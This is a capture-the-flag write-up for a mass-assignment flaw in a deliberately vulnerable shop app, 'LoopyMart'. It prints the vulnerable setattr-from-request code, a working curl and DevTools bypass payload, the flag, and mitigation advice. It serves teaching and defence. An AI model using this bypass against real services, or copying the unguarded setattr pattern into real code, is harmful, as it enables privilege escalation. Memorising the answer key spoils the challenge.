# CTF Challenge: Mass Assignment via Plus Upgrade

**Category:** Web / Mass Assignment  
**Difficulty:** Easy–Medium  
**Flag:** `CTF{m4ss_4ss1gnm3nt_plus_pwn3d}`

---

## Description

LoopyMart has a **Plus Membership** upgrade feature accessible from the Profile
page (Membership tab).  Clicking "Upgrade Now" makes the browser call
`POST /auth/upgrade-black`.  For ordinary users the server immediately responds
with HTTP 403 "You are not eligible for LoopyMart Plus membership."

Your goal: bypass the eligibility check and become a Plus member—returning the
flag as part of the upgrade response.

---

## Vulnerability

**Endpoint:** `POST /auth/upgrade-black`  
**Sink:** `backend/app/api/auth.py` → `upgrade_to_black()`  
**CWE:** [CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)

### Root cause

The endpoint accepts an optional JSON body as a raw `dict` and iterates over
every key, blindly writing it onto the SQLAlchemy `User` model via `setattr()`
**before** the eligibility gate is evaluated:

```python
# ⚠️ VULNERABLE: no allowlist — attacker controls what gets set
for k, v in data.items():
    setattr(user, k, v)

# Gate runs *after* mass-assignment; user object already modified
if not getattr(user, "is_plus_eligible", False):
    raise HTTPException(status_code=403, detail="You are not eligible …")
```

Because `setattr()` sets an arbitrary attribute on the in-memory object, any
key the attacker sends becomes accessible via `getattr()`.  Sending
`{"is_plus_eligible": true}` sets that attribute to `True`, the gate passes,
the upgrade is committed to the database, and the flag is included in the
response as `plus_flag`.

### Why the UI always fails

The Vue frontend calls `client.post('/auth/upgrade-black')` with **no request
body**, so `data` is always `{}`.  The loop is a no-op and `is_plus_eligible`
is never set → gate rejects → HTTP 403 → browser alert "You are not eligible".

---

## Exploitation

### Automated

```bash
# Fresh throwaway account (recommended — avoids "already a member" error)
python solutions/mass-assignment-plus/solve.py --url http://localhost:8001

# Existing account that has NOT yet been upgraded
python solutions/mass-assignment-plus/solve.py \
    --url http://localhost:8001 \
    --email you@example.com --password yourpassword --no-register
```

Expected output:
```
[+] Registered fresh account: ctf-solver-<hex>@loopymart.ctf
[*] Sending mass-assignment bypass payload to POST /auth/upgrade-black …
[+] Upgrade succeeded!  Flag: CTF{m4ss_4ss1gnm3nt_plus_pwn3d}
[+] Done.
```

### Manual (curl)

```bash
# 1. Login
TOKEN=$(curl -s -X POST http://localhost:8001/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"you@example.com","password":"yourpassword"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

# 2. Send the mass-assignment bypass payload
curl -s -X POST http://localhost:8001/auth/upgrade-black \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"is_plus_eligible": true}' \
  | python3 -m json.tool
```

The JSON response will include:
```json
{
  "is_black_member": true,
  "plus_flag": "CTF{m4ss_4ss1gnm3nt_plus_pwn3d}",
  ...
}
```

### Browser DevTools (no tooling)

1. Open the Profile → Membership tab and click "Upgrade Now".
   Note the alert: "You are not eligible for LoopyMart Plus membership."
2. Open the Network tab → locate the failed `upgrade-black` request.
3. Right-click → "Copy as fetch" (or "Copy as cURL") and paste it into the
   browser Console (or terminal).
4. Add the JSON payload `{"is_plus_eligible": true}` as the request body and
   resend.  The flag appears in the response JSON.
5. Reload the Membership tab — the flag is now displayed in the UI.

---

## Mitigation

1. **Strict request schema** — replace `data: dict = Body(default={})` with a
   Pydantic model that only declares the fields the endpoint actually needs
   (none in this case, since the upgrade flow requires no input from the user).
2. **No raw `setattr()` from user input** — if dynamic field updates are ever
   needed, maintain an explicit allowlist of mutable attribute names and
   validate that each key is in that list before calling `setattr()`.
3. **Separate the eligibility signal from the user object** — eligibility
   should come from a verified source (DB column, role check, payment record)
   rather than an attribute that can be injected on-the-fly.

---

## Flag

`CTF{m4ss_4ss1gnm3nt_plus_pwn3d}`
